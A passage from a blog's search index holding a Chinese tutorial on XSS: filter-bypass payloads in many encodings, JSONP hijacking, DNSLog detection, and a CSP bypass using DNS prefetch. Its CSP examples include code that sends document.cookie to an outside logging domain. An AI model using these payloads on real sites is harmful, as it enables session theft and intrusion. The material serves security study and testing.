+<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
+<li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li>
+<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
+<li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li>
+<li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
+</ul>
+<h3 id="HTML无法执行脚本的标签"><a href="#HTML无法执行脚本的标签" class="headerlink" title="HTML无法执行脚本的标签"></a>HTML无法执行脚本的标签</h3><p>在某些标签的内部，通过内嵌引入的脚本是不会执行的，需要通过闭合原有的标签才能执行。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> (noscript 元素用来定义在脚本未被执行时的替代内容(文本))</span><br><span class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span> (noframes 元素可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部)</span><br><span class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还有一些标签，直接无法嵌套其他标签，系统会提示报错：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XSS常见绕过方式"><a href="#XSS常见绕过方式" class="headerlink" title="XSS常见绕过方式"></a>XSS常见绕过方式</h2><h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><ul>
+<li><p><strong>使用上述的其他标签代替</strong></p>
+</li>
+<li><p><strong>大小写绕过</strong></p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRipt</span>&gt;</span><span class="javascript">aLErt(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>双写绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>字符拼接</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><strong>编码绕过</strong></p>
+<ul>
+<li>Unicode编码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>url编码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Ascii码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>hex</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>八进制</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>base64</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><strong>内嵌编码后TAB</strong></p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>多重尖括号</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用一些字符绕过”.js”过滤</strong></li>
+</ul>
+<p>将JS文件重命名为图像</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="过滤空格-引号"><a href="#过滤空格-引号" class="headerlink" title="过滤空格/引号"></a>过滤空格/引号</h3><ul>
+<li><strong>使用<code>/</code>代替</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/);</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="过滤单-双引号"><a href="#过滤单-双引号" class="headerlink" title="过滤单/双引号"></a>过滤单/双引号</h3><ul>
+<li><strong>使用反引号代替</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>编码绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><ul>
+<li><strong>使用 throw 绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1337</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>onerror</code>在每次javascript执行异常时都会被激活，调用指定的处理程序，并且<code>throw</code>语句可创建一个发送到<code>onerror</code>处的包含表达式的自定义异常。因为<code>throw</code>是一个语句，在和<code>onerror</code>配合使用时需要用分号隔离，避免被包含。</p>
+<ul>
+<li><strong>使用``` `代替</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>HTML编码绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="过滤URL地址"><a href="#过滤URL地址" class="headerlink" title="过滤URL地址"></a>过滤URL地址</h3><ul>
+<li><strong>使用URL编码</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用IP</strong></li>
+</ul>
+<p>使用进制转换</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>html标签中用<code>//</code>可以代替<code>http://</code></strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用<code>\\</code></strong></li>
+</ul>
+<p>但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`\\<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用中文句号代替英文点号</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>利用data类型的url代替<code>http://</code></strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text,alert()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="XSS高级利用方式"><a href="#XSS高级利用方式" class="headerlink" title="XSS高级利用方式"></a>XSS高级利用方式</h2><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>script标签是可以加载异域的JavaScript并执行的，通过预先设定好的callback函数来实现和非同源页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
+<p>a网站的前端代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>b网站的后台代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>典型的JSON劫持就是通过定义一个跟JSON接口中callback参数值相同的函数来接收JSON接口的数据，它其实就是JSON接口数据加载成功后的callback函数。JSON劫持的产生原因，重点还是在于对调用方没有做判断，或者说他的这种接口地址是固定的或者可猜测的。</p>
+<p>example：</p>
+<p>b网站的JSONP接口为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;haorooms.com&#x2F;data.php?callback&#x3D;dosomething</span><br></pre></td></tr></table></figure>
+<p>在上面的JSONP接口中，dosomething是可以修改的，我们改为<code>&lt;img src=0 onerror=alert(0)&gt;</code>，b网站后端没有对传入的参数进行检查过滤，那么会返回：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;0 onerror&#x3D;alert(0)&gt;&#x2F;&#x2F;[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</span><br></pre></td></tr></table></figure>
+<p>一旦如果开发不严谨，没有对Content-Type进行设置或者为text/html或者application/json，可以将内容解析为html的就可能导致XSS的产生。</p>
+<h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>对于没有回显的XSS，我们要想知道是否成功也可以利用<code>src</code>属性填入得到的域名。</p>
+<p>example：</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?input&#x3D;&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.t6n089.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317151942334.png" alt="image-20210317151942334"></p>
+<h4 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h4><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。</p>
+<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。有趣的是，DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>由于DNS预解析可以绕过CSP进行解析，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。</p>
+<p>example:</p>
+<p>网站的源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;test&quot;,&quot;test&quot;,time()+3600);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DNSLog_XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">$myfile &#x3D; fopen(&quot;.&#x2F;set_cookie.js&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($myfile, $xss);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;set_cookie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里网站通过<code>&lt;meta&gt;</code>标签设置了CSP为只能加载当前域名的脚本，也就是说无法使用内联的脚本，攻击者需要找到能够注入XSS的JavaScript脚本的外联文件，这里我们可以看到后端把我们输入的值写入了<code>set_cookie.js</code>文件中，然后又通过外联脚本引入了这个文件，这样我们就可以通过这里来进行XSS攻击。</p>
+<p>在没有CSP情况下，我们通常是通过<code>&lt;img&gt;</code>等有src属性的标签带上cookie作为参数去访问我们的服务器：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://t6n089.ceye.io/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<p>由于这里有CSP限制了不能读取外部的资源，因此这里会报错。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163246373.png" alt="image-20210318163246373"></p>
+<p>这里我们就可以使用DNS预解析去进行绕过：</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML&#x3D;&quot;&lt;link rel&#x3D;&#39;dns-prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;&quot;+document.cookie.split(&#x2F;;|&#x3D;&#x2F;)[0].trim()+&quot;.t6n089.ceye.io&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>URL编码后：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML%3D%22%3Clink%20rel%3D&#39;dns-prefetch&#39;%20href%3D&#39;http%3A%2F%2F%22%2Bdocument.cookie.split(%2F%3B%7C%3D%2F)%5B0%5D.trim()%2B%22.t6n089.ceye.io&#39;%3E%22%3B</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
+<p>这种利用方法十分苛刻，因为不仅要找到能够修改后台的外联JavaScript文件的方法，而且作为XSS攻击，此payload过长，容易被怀疑，而使用短链接加载外部脚本有会被CSP禁止，再加上根据DNS的规定，域名的长度是有限制的，有时可能不发将长cookie完全带出。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.fooying.com/the-art-of-xss-1-introduction/#" >跨站的艺术-XSS入门与介绍<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.sqlsec.com/2020/01/xss.html" >XSS从零开始<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://websec.readthedocs.io/zh/latest/index.html" > Web安全学习笔记<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/u010648555/article/details/108351169" >XSS(跨站脚本攻击)相关内容总结整理<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/4067#toc-4" >XSS总结<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
